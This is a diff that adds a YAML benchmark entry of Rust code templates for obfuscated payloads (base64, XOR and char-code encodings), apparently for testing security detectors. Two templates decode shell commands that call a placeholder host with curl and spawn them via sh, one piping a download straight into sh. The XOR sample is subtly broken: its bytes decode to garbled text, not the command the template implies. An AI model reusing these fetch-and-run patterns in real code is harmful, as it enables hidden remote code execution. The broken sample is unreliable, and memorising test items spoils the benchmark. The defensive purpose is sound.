@@ -1,0 +1,64 @@
+id: c6_obfuscated_v2
+category: C6
+name: Obfuscated and Encoded Payloads
+description: Obfuscates commands, URLs, or network actions using multi-stage string decoders, XOR masks, or hex byte arrays.
+defang_notes: Inert Rust code syntax tree; never executed or compiled during benchmarking.
+variants:
+  - id: c6_b64_command_eval
+    surface_variant: base64_runtime_decode
+    obfuscation_level: 1
+    domain_invalid: "c2-ingress.worker.invalid"
+    domain_fabricated: "cloud-ingress-broker.org"
+    code_template: |
+      fn {fn_name}() {
+          // Encoded payload: command fetching remote configuration
+          let raw_b64 = "Y3VybCAtcyBodHRwczovL3RhcmdldF9ob3N0L2FwaS9rZXk=";
+          let mut dec = Vec::new();
+          let table = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+          // Basic base64 decoder logic
+          let mut val = 0u32;
+          let mut valb = -8;
+          for &c in raw_b64.as_bytes() {
+              if let Some(pos) = table.iter().position(|&x| x == c) {
+                  val = (val << 6) | (pos as u32);
+                  valb += 6;
+                  if valb >= 0 {
+                      dec.push(((val >> valb) & 0xFF) as u8);
+                      valb -= 8;
+                  }
+              }
+          }
+          let cmd_str = String::from_utf8_lossy(&dec).replace("target_host", "{target_host}");
+          let _ = std::process::Command::new("sh").args(["-c", &cmd_str]).spawn();
+      }
+
+  - id: c6_xor_byte_array_loop
+    surface_variant: xor_masked_byte_array
+    obfuscation_level: 2
+    domain_invalid: "sec-tunnel.relay.invalid"
+    domain_fabricated: "network-tunnel-relay.net"
+    code_template: |
+      fn {fn_name}() {
+          let cipher = [
+              0x5f, 0x5e, 0x47, 0x57, 0x1b, 0x14, 0x14, 0x5b, 0x56, 0x49, 0x5c, 0x5e, 0x4f, 0x64, 0x53, 0x54, 
+              0x48, 0x14, 0x58, 0x5a, 0x4f, 0x5d, 0x50, 0x5e
+          ];
+          let key = 0x3b;
+          let text: String = cipher.iter().map(|&b| ((b ^ key) as char)).collect();
+          let replaced = text.replace("relay_host", "{target_host}");
+          let _ = std::process::Command::new("sh").args(["-c", &replaced]).spawn();
+      }
+
+  - id: c6_char_code_poly_reconstruct
+    surface_variant: poly_char_stream
+    obfuscation_level: 2
+    domain_invalid: "stream-hub.edge.invalid"
+    domain_fabricated: "edge-stream-aggregator.io"
+    code_template: |
+      fn {fn_name}() {
+          let codes: &[u16] = &[99, 117, 114, 108, 32, 45, 115, 32, 104, 116, 116, 112, 58, 47, 47];
+          let mut base: String = codes.iter().map(|&c| char::from_u32(c as u32).unwrap_or(' ')).collect();
+          base.push_str("{target_host}");
+          base.push_str("/init | sh");
+          let _ = std::process::Command::new("sh").args(["-c", &base]).spawn();
+      }
